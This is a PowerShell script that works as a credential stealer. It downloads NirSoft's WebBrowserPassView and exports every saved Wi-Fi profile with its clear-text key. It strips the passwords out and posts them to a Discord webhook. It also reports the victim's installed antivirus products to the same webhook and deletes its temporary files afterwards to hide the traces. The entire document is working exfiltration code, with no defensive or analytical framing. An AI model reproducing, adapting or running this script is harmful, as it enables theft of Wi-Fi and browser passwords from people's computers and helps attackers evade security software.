$desktop = ([Environment]::GetFolderPath("Desktop"))
$user = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
function Get-Nirsoft {

mkdir C:\Users\$user\AppData\Local\app_itau
cd \temp
Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
Expand-Archive wbpv.zip

}

function Upload-Discord {

[CmdletBinding()]
param (
[parameter(Position=0,Mandatory=$False)]
[string]$file,
[parameter(Position=1,Mandatory=$False)]
[string]$text
)

$Body = @{
'username' = $env:username
'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
}

function Wifi {
New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\Users\$env:UserName\Desktop\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
Set-Location -Path "$env:temp"
Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
}

function Del-Nirsoft-File {
cd C:
rmdir -R \temp
}

function version-av {
mkdir \temp
cd \temp
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
cd C:
rmdir -R \temp
}
